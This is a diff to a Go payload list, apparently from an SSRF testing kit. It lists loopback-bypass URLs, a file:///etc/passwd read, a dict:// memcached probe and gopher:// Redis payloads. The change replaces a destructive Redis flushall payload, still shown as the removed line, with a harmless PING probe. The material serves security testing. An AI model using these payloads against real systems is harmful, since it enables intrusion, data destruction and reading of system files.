@@ -95,7 +95,7 @@ var attackPayloads = map[string][]kitPayload{
 		{Payload: `http://0.0.0.0/`, Note: "Quad-zero loopback — bypasses common 127.* blocklists."},
 		{Payload: `http://2130706433/`, Note: "Decimal-encoded 127.0.0.1 — bypasses string blocklists."},
 		{Payload: `http://127.1/`, Note: "Short-form loopback (some libs expand). Bypasses naive regex."},
-		{Payload: `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a`, Note: "Gopher protocol smuggling — Redis flushall PoC. Tests for unrestricted scheme handling."},
+		{Payload: `gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a`, Note: "Gopher protocol smuggling — harmless Redis PING probe (expect +PONG). Tests for unrestricted scheme handling without mutating data. Escalate to intrusive commands only under explicit operator authorization."},
 		{Payload: `file:///etc/passwd`, Note: "Local file inclusion via file:// scheme. Look for Unix passwd content in response."},
 		{Payload: `dict://127.0.0.1:11211/stats`, Note: "Memcached stats probe via dict:// scheme."},
 	},
